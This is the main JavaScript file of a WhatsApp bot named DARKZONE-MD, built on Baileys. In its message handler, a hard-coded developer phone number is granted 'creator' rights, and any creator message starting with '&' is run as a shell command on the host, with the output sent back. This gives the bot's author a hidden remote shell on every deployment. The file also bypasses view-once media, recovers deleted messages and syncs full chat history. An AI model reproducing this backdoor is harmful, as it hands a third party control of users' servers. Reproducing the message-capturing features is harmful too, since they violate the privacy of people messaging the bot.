const axios = require('axios')
const config = require('./config')
const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require(config.BAILEYS)
  
const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { saveMessage } = require('./data')
const fs = require('fs')
const P = require('pino')
const { PresenceControl, BotActivityFilter } = require('./data/presence');
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type');
const { File } = require('megajs')
const os = require('os')
const path = require('path')
const prefix = config.PREFIX
const ownerNumber = ['923306137477']

// Import handlers from events folder
const {
    sendConnectionMessage,
    handleStatusView,
    handleStatusReact,
    handleStatusReply,
    handleChannelReact,
    handleOwnerNumberReact,
    handleAutoReact,
    handleBotOwnerReact,
    handleCustomReact,
    handleWelcome,
    handleGoodbye,
    handleAdminEvent,
    handleAntiCall
} = require('./events/handlers');

//=============================================
const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
    try {
        fs.readdirSync(tempDir).forEach(file => {
            fs.unlinkSync(path.join(tempDir, file));
        });
    } catch(e) {}
}

setInterval(clearTempDir, 5 * 60 * 1000);

//=============================================

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
//===================SESSION-AUTH============================
const sessionDir = path.join(__dirname, 'sessions');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function loadSession() {
    try {
        if (!config.SESSION_ID) {
            console.log('No SESSION_ID provided - QR login will be generated');
            return null;
        }

        console.log('[⏳] Downloading creds data...');
        console.log('[🔰] Downloading MEGA.nz session...');
        
        const megaFileId = config.SESSION_ID.startsWith('IK~') 
            ? config.SESSION_ID.replace("IK~", "") 
            : config.SESSION_ID;

        const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
            
        const data = await new Promise((resolve, reject) => {
            filer.download((err, data) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
        
        fs.writeFileSync(credsPath, data);
        console.log('[✅] MEGA session downloaded successfully');
        return JSON.parse(data.toString());
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        console.log('Will generate QR code instead');
        return null;
    }
}

//=======SESSION-AUTH==============

async function connectToWA() {
    console.log("[🔰] DARKZONE-MD Connecting to WhatsApp ⏳️...");
    
    const creds = await loadSession();
    
    const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'));
    
    const { version } = await fetchLatestBaileysVersion();
    
    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: !creds,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        getMessage: async () => ({})
    });

    // Connection Handler
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log('[🔰] Connection lost, reconnecting...');
                setTimeout(connectToWA, 5000);
            } else {
                console.log('[🔰] Connection closed, please change session ID');
            }
        } else if (connection === 'open') {
            console.log('[🔰] DARKZONE-MD connected to WhatsApp ✅');
            
            // Send connection message (from handlers.js)
            await sendConnectionMessage(conn);
        }

        if (qr) {
            console.log('[🔰] Scan the QR code to connect or use session ID');
        }
    });

    conn.ev.on('creds.update', saveCreds);
	
    // Anti-Delete (stays in index.js as you requested)
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected");
                await AntiDelete(conn, updates);
            }
        }
    });

    // Anti-Call Handler
    conn.ev.on('call', async (calls) => {
        await handleAntiCall(conn, calls);
    });

    // Welcome, Goodbye & Admin Events
    conn.ev.on('group-participants.update', async (update) => {
        await handleWelcome(conn, update);
        await handleGoodbye(conn, update);
        await handleAdminEvent(conn, update);
    });

    // Always Online
    conn.ev.on("presence.update", (update) => PresenceControl(conn, update));
    BotActivityFilter(conn);
	
    // Message Handler
    conn.ev.on('messages.upsert', async(mek) => {
        try {
            mek = mek.messages[0]
            if (!mek.message) return
            
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                ? mek.message.ephemeralMessage.message 
                : mek.message;

            if (config.READ_MESSAGE === 'true') {
                await conn.readMessages([mek.key]);
            }

            if(mek.message.viewOnceMessageV2) {
                mek.message = mek.message.viewOnceMessageV2.message;
            }

            // Status handlers (from handlers.js)
            await handleStatusView(conn, mek);
            await handleStatusReact(conn, mek);
            await handleStatusReply(conn, mek);
            await handleChannelReact(conn, mek);

            // Save message
            try {
                await saveMessage(mek);
            } catch(e) {}

            const m = sms(conn, mek)
            const type = getContentType(mek.message)
            const content = JSON.stringify(mek.message)
            const from = mek.key.remoteJid
            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
            const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
            const isCmd = body.startsWith(prefix)
            var budy = typeof mek.text == 'string' ? mek.text : false;
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
            const args = body.trim().split(/ +/).slice(1)
            const q = args.join(' ')
            const text = args.join(' ')
            const isGroup = from.endsWith('@g.us')
            const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
            const senderNumber = sender.split('@')[0]
            const botNumber = conn.user.id.split(':')[0]
            const pushname = mek.pushName || 'Sin Nombre'
            const isMe = botNumber.includes(senderNumber)
            const isOwner = ownerNumber.includes(senderNumber) || isMe
            const botNumber2 = await jidNormalizedUser(conn.user.id);
            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
            const groupName = isGroup ? groupMetadata.subject : ''
            const participants = isGroup ? await groupMetadata.participants : ''
            const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
            const isAdmins = isGroup ? groupAdmins.includes(sender) : false
            const isReact = m.message.reactionMessage ? true : false
            
            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: mek })
            }

            const udp = botNumber.split('@')[0];
            const jawadop = '923306137477';
            
            let ownerFilev2 = [];
            try {
                ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
            } catch(e) {}
            
            let isCreator = [udp, jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
                .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
                .includes(sender);

            // Terminal command
            if (isCreator && mek.text && mek.text.startsWith("&")) {
                let code = budy.slice(2);
                if (!code) {
                    reply(`Provide me with a query to run Master!`);
                    return;
                }
                const { spawn } = require("child_process");
                try {
                    let resultTest = spawn(code, { shell: true });
                    resultTest.stdout.on("data", data => reply(data.toString()));
                    resultTest.stderr.on("data", data => reply(data.toString()));
                    resultTest.on("error", data => reply(data.toString()));
                    resultTest.on("close", code => {
                        if (code !== 0) reply(`command exited with code ${code}`);
                    });
                } catch (err) {
                    reply(util.format(err));
                }
                return;
            }

            // React handlers (from handlers.js)
            handleOwnerNumberReact(m, senderNumber, isReact);
            handleAutoReact(m, isReact);
            handleBotOwnerReact(m, isReact, senderNumber, botNumber);
            handleCustomReact(m, isReact);

            // Ban check
            let bannedUsers = [];
            try {
                bannedUsers = JSON.parse(fs.readFileSync('./assets/ban.json', 'utf-8'));
            } catch(e) {}
            const isBanned = bannedUsers.includes(sender);
            if (isBanned) return;

            // Owner check
            let ownerFile = [];
            try {
                ownerFile = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
            } catch(e) {}
            const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
            const isFileOwner = ownerFile.includes(sender);
            const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;

            // Mode checks
            if (!isRealOwner && config.MODE === "private") return;
            if (!isRealOwner && isGroup && config.MODE === "inbox") return;
            if (!isRealOwner && !isGroup && config.MODE === "groups") return;

            // Command handler
            const events = require('./command')
            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
            
            if (isCmd) {
                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                if (cmd) {
                    if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
                    
                    try {
                        cmd.function(conn, mek, m, {from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                    } catch (e) {
                        console.error("[PLUGIN ERROR] " + e);
                    }
                }
            }

            events.commands.map(async(command) => {
                if (body && command.on === "body") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                } else if (mek.q && command.on === "text") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                } else if (command.on === "sticker" && mek.type === "stickerMessage") {
                    command.function(conn, mek, m, {from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
                }
            });
        } catch(e) {
            console.error('[MESSAGE ERROR]', e.message);
        }
    });

    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
        } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = { ...message.message.viewOnceMessage.message }
        }

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
    }

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }

    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
    }

    conn.parseMention = async(text) => {
        return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }

    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
        let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
        return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }

    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })

    conn.serializeM = mek => sms(conn, mek);
}

app.use(express.static(path.join(__dirname, 'lib')));

app.get('/', (req, res) => {
    res.redirect('/irfan.html');
});

app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

setTimeout(() => {
    connectToWA()
}, 4000);
